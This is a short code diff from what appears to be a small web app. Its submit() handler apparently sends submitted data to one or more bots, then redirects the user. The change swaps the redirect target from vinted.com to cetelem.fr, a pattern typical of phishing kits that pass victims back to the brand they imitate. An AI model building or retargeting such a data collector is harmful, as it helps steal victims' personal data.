@@ -36,7 +36,7 @@ def submit():
         except requests.exceptions.RequestException as e:
             return f"Erreur d’envoi avec le bot {bot['token'][:10]}... : {e}", 500
 
-    return redirect("https://www.vinted.com")
+    return redirect("https://www.cetelem.fr/fr/accueil")
 
 
 if __name__ == '__main__':
